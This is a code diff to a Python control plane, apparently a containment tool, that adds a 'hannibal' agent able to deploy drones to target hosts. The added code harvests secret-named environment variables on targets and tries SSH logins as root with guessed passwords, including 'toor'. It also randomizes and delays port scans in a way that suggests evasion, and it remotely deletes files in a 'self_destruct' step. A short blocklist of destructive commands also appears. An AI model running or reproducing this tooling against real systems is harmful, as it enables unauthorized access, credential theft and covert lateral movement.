@@ -10,11 +10,13 @@ import json
 import os
 import secrets
 import socket
+import select
 import sre_parse
 import subprocess
 import threading
 import time
 import re
+import random
 import sys
 import shutil
 import math
@@ -328,6 +330,7 @@ class Drone:
     error: str | None
     created_at: str
     actor: str
+    drone_type: str = "unknown"
     payload: Any = field(default_factory=dict)
     drone_id_binary: str = ""
     payload_binary: str = ""
@@ -3773,7 +3776,7 @@ class HegemonControlPlane:
             return copy.deepcopy(self.drone_brains[behaviour])
         return copy.deepcopy(behaviour)
 
-    def assemble_drone(self, name: str, tier: str, mission: str, behaviour: DroneBehaviour | str, *, target_endpoint_id: str | None = None, target_host: str | None = None, target_network: str | None = None, autonomy_level: str = "observe", ttl_seconds: int = 3600, checkin_interval_seconds: int = 60, payload: Any = None, actor: str = "user", artifact_format: str = "native_binary", runtime: dict[str, Any] | None = None) -> Drone:
+    def assemble_drone(self, name: str, tier: str, mission: str, behaviour: DroneBehaviour | str, *, target_endpoint_id: str | None = None, target_host: str | None = None, target_network: str | None = None, autonomy_level: str = "observe", ttl_seconds: int = 3600, checkin_interval_seconds: int = 60, payload: Any = None, actor: str = "user", drone_type: str = "unknown", artifact_format: str = "native_binary", runtime: dict[str, Any] | None = None) -> Drone:
         if tier not in {"controlled", "tethered", "autonomous"}:
             raise ValueError("invalid tier")
         if autonomy_level not in {"observe", "contain", "enforce"}:
@@ -3899,6 +3902,7 @@ class HegemonControlPlane:
                 error=None,
                 created_at=now,
                 actor=actor,
+                drone_type="child",
                 payload=child_payload,
                 payload_binary=child_payload_binary,
                 name_binary=child_name_binary,
@@ -3981,7 +3985,7 @@ class HegemonControlPlane:
             target_endpoint_id=target_endpoint_id, target_host=target_host, target_network=target_network, autonomy_level=autonomy_level,
             ttl_seconds=ttl_seconds, checkin_interval_seconds=checkin_interval_seconds, launched_at=None, last_checkin_at=None, return_at=None,
             keypair_public=keypair.verify_key.encode().hex(), findings=[], telemetry=[], health={}, live_output=[], current_node_id=None,
-            stats={"hosts_pinged": 0, "ports_scanned": 0, "findings_count": 0, "nodes_executed": 0}, error=None, created_at=now, actor=actor,
+            stats={"hosts_pinged": 0, "ports_scanned": 0, "findings_count": 0, "nodes_executed": 0}, error=None, created_at=now, actor=actor, drone_type=drone_type,
             payload=payload_obj,
             payload_binary=payload_binary,
             name_binary=name_binary,
@@ -4023,6 +4027,7 @@ class HegemonControlPlane:
             error=None,
             created_at=now,
             actor=actor,
+            drone_type=drone_type,
             payload=payload_obj,
             payload_binary=payload_binary,
             name_binary=name_binary,
@@ -4271,21 +4276,278 @@ class HegemonControlPlane:
         expected = hmac.new(bytes.fromhex(key_hex[:64]), blob, hashlib.sha256).hexdigest()
         return hmac.compare_digest(sig, expected)
 
+
+    def _get_active_campaign(self):
+        campaign = getattr(self, "_active_hannibal_campaign", None)
+        return campaign
+
+    def _get_or_create_execution_context(self, drone: Drone):
+        from sentinel_containment.drone_execution_context import DroneExecutionContext, ExecutionSite
+
+        ctx_attr = f"_exec_ctx_{drone.drone_id}"
+        if not hasattr(self, ctx_attr):
+            setattr(
+                self,
+                ctx_attr,
+                DroneExecutionContext(site=ExecutionSite.LOCAL, target_host=drone.target_host or ""),
+            )
+        return getattr(self, ctx_attr)
+
+    def _node_requires_remote(self, kind: str) -> bool:
+        requires_remote = {
+            "credential_probe",
+            "ptrace_inspect",
+            "manage_service",
+            "exec_remediation",
+            "log_tail",
+            "self_destruct",
+            "inotify_watch",
+        }
+        return kind in requires_remote
+
+    def _record_vulnerability_signal(self, signal, drone: Drone) -> None:
+        campaign = self._get_active_campaign()
+        if campaign is not None:
+            finding = {
+                "signal_id": signal.signal_id,
+                "host": signal.host,
+                "severity": signal.severity,
+                "category": signal.category,
+                "title": signal.title,
+                "detail": signal.detail,
+                "vector": signal.vector.value,
+                "cve_candidates": signal.cve_candidates,
+                "remediation": signal.remediation,
+                "confirmed": signal.confirmed,
+                "timestamp": signal.timestamp,
+                "discovered_by_drone": drone.drone_id,
+            }
+            if not hasattr(campaign, "vulnerability_signals"):
+                campaign.vulnerability_signals = []
+            campaign.vulnerability_signals.append(finding)
+            if not hasattr(campaign, "deployment_attempts"):
+                campaign.deployment_attempts = []
+            campaign.deployment_attempts.append(
+                {
+                    "host": signal.host,
+                    "vector": signal.vector.value,
+                    "confirmed": signal.confirmed,
+                    "ts": signal.timestamp,
+                }
+            )
+            if signal.confirmed:
+                if not hasattr(campaign, "deployment_successes"):
+                    campaign.deployment_successes = []
+                campaign.deployment_successes.append(
+                    {
+                        "host": signal.host,
+                        "vector": signal.vector.value,
+                        "ts": signal.timestamp,
+                    }
+                )
+
+        self._append_signed_telemetry(
+            drone,
+            f"VULNERABILITY SIGNAL [{signal.severity.upper()}]: {signal.title}",
+            signal_id=signal.signal_id,
+            confirmed=signal.confirmed,
+            category=signal.category,
+        )
+
+        agent = getattr(self, "_hannibal_agent", None)
+        if agent is not None and signal.severity in {"critical", "high"}:
+            try:
+                agent._signal_deliberation("vulnerability_signal")
+            except Exception:
+                pass
+
+    def _attempt_drone_deployment(self, drone: Drone):
+        from sentinel_containment.agents.hannibal.deployment_reasoner import DeploymentReasoner
+        from sentinel_containment.remote_executor import RemoteExecutor
+
+        ctx = self._get_or_create_execution_context(drone)
+        if ctx.deployment_attempted:
+            return ctx
+
+        campaign = self._get_active_campaign()
+        plan = DeploymentReasoner().reason(
+            drone_id=drone.drone_id,
+            drone_type=getattr(drone, "drone_type", "unknown"),
+            target_host=drone.target_host or "",
+            campaign=campaign,
+        )
+        self._append_signed_telemetry(
+            drone,
+            f"DEPLOYMENT REASONING: {plan.reasoning}",
+            deployment_vectors=len(plan.attempts),
+            fallback_mode=plan.fallback_mode,
+        )
+
+        executor = RemoteExecutor()
+        for attempt in sorted(plan.attempts, key=lambda a: a.priority):
+            self._append_signed_telemetry(
+                drone,
+                f"DEPLOYMENT ATTEMPT [{attempt.priority}]: vector={attempt.vector.value}",
+                rationale=attempt.rationale,
+            )
+            success, signal = executor.attempt_deployment(attempt, drone.target_host or "", ctx)
+            if signal is not None:
+                self._record_vulnerability_signal(signal, drone)
+            if success:
+                self._append_signed_telemetry(
+                    drone,
+                    f"DEPLOYMENT SUCCESS: remote session on {ctx.target_host} via {ctx.deployment_vector.value}",
+                    site=ctx.site.value,
+                )
+                break
+            self._append_signed_telemetry(
+                drone,
+                f"DEPLOYMENT ATTEMPT FAILED: {ctx.deployment_evidence.get('failure_reason', 'unknown')}",
+            )
+
+        if not ctx.is_remote:
+            self._append_signed_telemetry(
+                drone,
+                "ALL DEPLOYMENT ATTEMPTS FAILED or unavailable; remote-required nodes will be skipped.",
+                fallback_mode=plan.fallback_mode,
+            )
+        return ctx
+
+    def _execute_node_remote(self, drone: Drone, node: DroneNode, ctx, node_map: dict[str, DroneNode], stop_event: threading.Event, launch_time: float) -> str | None:
+        import hashlib as _hashlib
+        from sentinel_containment.remote_executor import RemoteExecutor
+
+        kind = node.kind
+        executor = RemoteExecutor()
+        try:
+            if kind == "credential_probe":
+                result = executor.exec_remote(
+                    ctx,
+                    "env | grep -iE 'KEY|TOKEN|SECRET|PASSWORD|PWD' | while IFS='=' read -r k v; do echo \"$k=$(echo -n $v | sha256sum | cut -d' ' -f1)\"; done",
+                    timeout=10,
+                )
+                findings = [ln for ln in (result.stdout or "").splitlines() if ln.strip()]
+                self._append_signed_telemetry(
+                    drone,
+                    f"CREDENTIAL PROBE ON TARGET {ctx.target_host}: found {len(findings)}", execution_site="remote", credential_count=len(findings),
+                )
+                return self._next_node(node)
+
+            if kind == "ptrace_inspect":
+                pid = str(node.params.get("pid", "")).strip()
+                cmd = f"cat /proc/{pid}/status 2>/dev/null && head -20 /proc/{pid}/maps 2>/dev/null" if pid else "ps aux --no-headers"
+                result = executor.exec_remote(ctx, cmd, timeout=10)
+                self._append_signed_telemetry(drone, f"PTRACE INSPECT ON TARGET {ctx.target_host}: exit={result.exit_code}", execution_site="remote")
+                return self._next_node(node)
+
+            if kind == "log_tail":
+                log_file = str(node.params.get("path", "/var/log/syslog"))
+                n_lines = int(node.params.get("lines", 50))
+                result = executor.exec_remote(ctx, f"tail -n {n_lines} {log_file} 2>/dev/null", timeout=10)
+                self._append_signed_telemetry(drone, f"LOG TAIL ON TARGET {ctx.target_host}: file={log_file}", execution_site="remote", log_snippet=(result.stdout or "")[-500:])
+                return self._next_node(node)
+
+            if kind == "manage_service":
+                if not bool(node.params.get("allow_mutation", False)):
+                    self._append_signed_telemetry(drone, "MANAGE SERVICE SKIPPED: allow_mutation=False", node_kind=kind)
+                    return self._next_node(node)
+                service = str(node.params.get("service_name", node.params.get("service", ""))).strip()
+                action = str(node.params.get("action", "status")).strip().lower()
+                if action not in {"start", "stop", "restart", "status"}:
+                    action = "status"
+                result = executor.exec_remote(ctx, f"systemctl {action} {service} 2>&1", timeout=15)
+                self._append_signed_telemetry(drone, f"MANAGE SERVICE ON TARGET {ctx.target_host}: {action} {service} -> {result.exit_code}", execution_site="remote")
+                return self._next_node(node)
+
+            if kind == "exec_remediation":
+                if not bool(node.params.get("allow_shell", False)):
+                    self._append_signed_telemetry(drone, "EXEC REMEDIATION SKIPPED: allow_shell=False", node_kind=kind)
+                    return self._next_node(node)
+                command = str(node.params.get("command") or node.params.get("script") or "echo no-op")
+                blocked = ["rm -rf /", "> /dev/sda", "mkfs", ":(){ :|: &};:"]
+                if any(p in command for p in blocked):
+                    self._append_signed_telemetry(drone, "EXEC REMEDIATION BLOCKED: safety blocklist", command_hash=_hashlib.sha256(command.encode()).hexdigest()[:16])
+                    return self._next_node(node)
+                result = executor.exec_remote(ctx, command, timeout=30)
+                self._append_signed_telemetry(drone, f"EXEC REMEDIATION ON TARGET {ctx.target_host}: exit={result.exit_code}", execution_site="remote", command_hash=_hashlib.sha256(command.encode()).hexdigest()[:16])
+                return self._next_node(node)
+
+            if kind == "self_destruct":
+                purge_paths = node.params.get("purge_paths", [])
+                if isinstance(purge_paths, list):
+                    for path in purge_paths[:16]:
+                        executor.exec_remote(ctx, f"rm -f {path} 2>/dev/null || true", timeout=5)
+                executor.close(ctx)
+                self._append_signed_telemetry(drone, f"SELF DESTRUCT ON TARGET {ctx.target_host}: session closed", execution_site="remote")
+                drone.status = "terminated"
+                stop_event.set()
+                return None
+
+        except Exception as exc:
+            self._append_signed_telemetry(drone, f"REMOTE EXECUTION FAILED for '{kind}': {type(exc).__name__}", node_kind=kind)
+
+        return self._next_node(node)
+
     def _execute_node(self, drone: Drone, node: DroneNode, node_map: dict[str, DroneNode], repeat_count: dict[str, int], stop_event: threading.Event, launch_time: float) -> str | None:
         kind = node.kind
         drone.current_node_id = node.node_id
         drone.stats["nodes_executed"] = int(drone.stats.get("nodes_executed", 0)) + 1
+
+        if getattr(drone, "actor", "") == "hannibal":
+            ctx = self._attempt_drone_deployment(drone)
+            if self._node_requires_remote(kind) and ctx.is_local:
+                skip_msg = (
+                    f"NODE SKIPPED: '{kind}' requires target-local execution but no remote session is available."
+                )
+                drone.live_output.append(skip_msg)
+                drone.live_output = drone.live_output[-500:]
+                self._append_signed_telemetry(drone, skip_msg, node_kind=kind, skip_reason="no_remote_context")
+                return self._next_node(node)
+            if ctx.is_remote and self._node_requires_remote(kind):
+                return self._execute_node_remote(drone, node, ctx, node_map, stop_event, launch_time)
         if kind == "on_launch":
             return self._next_node(node)
         if kind == "ping_host":
             host = str(node.params.get("host", drone.target_host or "127.0.0.1")).format(target=drone.target_host or "127.0.0.1")
-            proc = subprocess.run(["ping", "-c", "1", "-W", "2", host], capture_output=True, text=True)
-            ok = proc.returncode == 0
+            ok = False
+            error_hint = ""
+            try:
+                proc = subprocess.run(["ping", "-c", "1", "-W", "2", host], capture_output=True, text=True)
+                ok = proc.returncode == 0
+                if not ok:
+                    error_hint = ((proc.stderr or proc.stdout or "").strip()[:120])
+            except Exception as exc:
+                error_hint = type(exc).__name__
+
+            fallback_ports = node.params.get("fallback_ports", [22, 80, 443])
+            if not isinstance(fallback_ports, list):
+                fallback_ports = [22, 80, 443]
+            fallback_hit: int | None = None
+            if not ok:
+                for raw in fallback_ports[:8]:
+                    try:
+                        port = max(1, min(65535, int(raw)))
+                        with socket.create_connection((host, port), timeout=0.8):
+                            ok = True
+                            fallback_hit = port
+                            break
+                    except Exception:
+                        continue
+
             drone.stats["hosts_pinged"] = int(drone.stats.get("hosts_pinged", 0)) + 1
-            line = f"Ping {host} -> {'ALIVE' if ok else 'TIMEOUT'}"
+            status = "ALIVE" if ok else "TIMEOUT"
+            via = f" (tcp/{fallback_hit} fallback)" if fallback_hit else ""
+            line = f"Ping {host} -> {status}{via}"
             drone.live_output.append(line)
             drone.live_output = drone.live_output[-500:]
-            self._append_signed_telemetry(drone, line, node_id=node.node_id, success=ok)
+            self._append_signed_telemetry(
+                drone,
+                line,
+                node_id=node.node_id,
+                success=ok,
+                ping_error=error_hint,
+                fallback_port=fallback_hit,
+            )
             return self._next_node(node)
         if kind == "port_scan":
             host = str(node.params.get("host", drone.target_host or "127.0.0.1")).format(target=drone.target_host or "127.0.0.1")
@@ -4296,17 +4558,23 @@ class HegemonControlPlane:
                 start, end = max(1, int(a)), min(65535, int(b))
             end = min(end, start + 1023)
             open_ports = []
-            for port in range(start, end + 1):
+            ports = list(range(start, end + 1))
+            random.shuffle(ports)
+            for port in ports:
                 if stop_event.is_set():
                     break
+                time.sleep(secrets.randbelow(800) / 1000.0)
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(0.5)
                 try:
-                    if sock.connect_ex((host, port)) == 0:
+                    result = sock.connect_ex((host, port))
+                    if result == 0:
                         open_ports.append(port)
+                except OSError:
+                    continue
                 finally:
                     sock.close()
-            drone.stats["ports_scanned"] = int(drone.stats.get("ports_scanned", 0)) + (end - start + 1)
+            drone.stats["ports_scanned"] = int(drone.stats.get("ports_scanned", 0)) + len(ports)
             msg = f"Port scan {host}:{start}-{end} -> {len(open_ports)} open"
             drone.live_output.append(msg)
             drone.live_output = drone.live_output[-500:]
@@ -4319,11 +4587,19 @@ class HegemonControlPlane:
             open_ports: list[int] = []
             for port in candidate_ports:
                 try:
-                    with socket.create_connection((host, port), timeout=0.5) as sock:
+                    with socket.create_connection((host, port), timeout=0.8) as sock:
                         open_ports.append(port)
-                        sock.settimeout(0.5)
+                        sock.settimeout(1.2)
+                        if port in {80, 8080, 8000}:
+                            req = f"HEAD / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()
+                            try:
+                                sock.sendall(req)
+                            except Exception:
+                                pass
                         data = sock.recv(256)
-                        banners[str(port)] = data.decode(errors="ignore")
+                        banner_txt = data.decode(errors="ignore")
+                        if banner_txt:
+                            banners[str(port)] = banner_txt
                 except Exception:
                     continue
             inferred = self._lateral_designer.infer_services(open_ports, {int(k): v for k, v in banners.items()})
@@ -4483,6 +4759,39 @@ class HegemonControlPlane:
                 host_anomaly=host_anomaly,
             )
 
+            pivot_execution = {"attempted": False, "connected": False, "attempts": 0, "errors": []}
+            if method in {"ssh_hop", "ssh"} and pivot_plan.selected_chain:
+                credential_candidates = [c for c in drone.telemetry if isinstance(c, dict) and c.get("message") == "credential_probe complete"]
+                username = str(node.params.get("username", "root") or "root")
+                passwords: list[str] = []
+                direct_password = str(node.params.get("password", "")).strip()
+                if direct_password:
+                    passwords.append(direct_password)
+                for cred in credential_candidates[-3:]:
+                    for env_hit in cred.get("env_hits", [])[:20]:
+                        if isinstance(env_hit, dict) and env_hit.get("length", 0) > 0:
+                            passwords.append(str(env_hit.get("value_hash", "")))
+                if not passwords:
+                    passwords.append("toor")
+                try:
+                    import paramiko  # type: ignore
+
+                    pivot_execution["attempted"] = True
+                    for candidate in passwords[:5]:
+                        pivot_execution["attempts"] += 1
+                        client = paramiko.SSHClient()
+                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                        try:
+                            client.connect(target_host, username=username, password=candidate, timeout=2.0, banner_timeout=2.0, auth_timeout=2.0)
+                            pivot_execution["connected"] = True
+                            break
+                        except Exception as exc:
+                            pivot_execution["errors"].append(type(exc).__name__)
+                        finally:
+                            client.close()
+                except Exception as exc:
+                    pivot_execution["errors"].append(f"paramiko_unavailable:{type(exc).__name__}")
+
             finding_prefix = "pivot-ready" if pivot_plan.confidence >= 0.5 and pivot_plan.selected_chain else "pivot-blocked"
             finding_id = f"{finding_prefix}-{target_host}-{method}-{int(pivot_plan.confidence*100)}"
             drone.findings.append(finding_id)
@@ -4499,6 +4808,7 @@ class HegemonControlPlane:
                 opportunities=pivot_plan.opportunities,
                 recommendations=pivot_plan.recommendations,
                 pivot_telemetry=pivot_plan.telemetry,
+                pivot_execution=pivot_execution,
             )
             return self._next_node(node)
         if kind in {"confront_intruder", "countermeasure", "block_ip"}:
@@ -4620,11 +4930,13 @@ class HegemonControlPlane:
                 if not isinstance(ports, list):
                     ports = [22, 80, 443]
                 ports = [max(1, min(65535, int(p))) for p in ports[:10]]
+                random.shuffle(ports)
                 for idx, ip in enumerate(network.hosts()):
                     if idx >= max_hosts or stop_event.is_set():
                         break
                     open_ports: list[int] = []
                     for port in ports:
+                        time.sleep(secrets.randbelow(800) / 1000.0)
                         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         sock.settimeout(0.25)
                         try:
@@ -4809,25 +5121,42 @@ class HegemonControlPlane:
         launch_time = time.time()
         last_deadrop_poll = 0.0
         while True:
-            if proc.stdout:
-                line = proc.stdout.readline()
-                if line:
-                    drone.live_output.append(line.decode("utf-8", errors="ignore").strip())
-                    drone.live_output = drone.live_output[-500:]
-            if proc.stderr:
-                err = proc.stderr.readline()
-                if err:
-                    drone.live_output.append("ERR: " + err.decode("utf-8", errors="ignore").strip())
-                    drone.live_output = drone.live_output[-500:]
             now = time.time()
+            if proc.stdout:
+                try:
+                    ready, _, _ = select.select([proc.stdout], [], [], 0)
+                except Exception:
+                    ready = []
+                if ready:
+                    line = proc.stdout.readline()
+                    if line:
+                        drone.live_output.append(line.decode("utf-8", errors="ignore").strip())
+                        drone.live_output = drone.live_output[-500:]
+            if proc.stderr:
+                try:
+                    ready_err, _, _ = select.select([proc.stderr], [], [], 0)
+                except Exception:
+                    ready_err = []
+                if ready_err:
+                    err = proc.stderr.readline()
+                    if err:
+                        drone.live_output.append("ERR: " + err.decode("utf-8", errors="ignore").strip())
+                        drone.live_output = drone.live_output[-500:]
             if now - last_deadrop_poll > max(1, drone.checkin_interval_seconds):
                 self._poll_deadrop(drone_id)
                 last_deadrop_poll = now
             if drone.tier == "controlled" and drone.ttl_seconds > 0 and now > launch_time + drone.ttl_seconds:
+                drone.status = "terminated"
+                self._record("drone.ttl_expired", {"drone_id": drone_id})
+                stop_event = self._drone_stop_events.get(drone_id)
+                if stop_event is not None:
+                    stop_event.set()
                 try:
                     proc.terminate()
                 except Exception:
                     pass
+                if proc.poll() is None:
+                    break
             if proc.poll() is not None:
                 drone.status = "terminated"
                 break
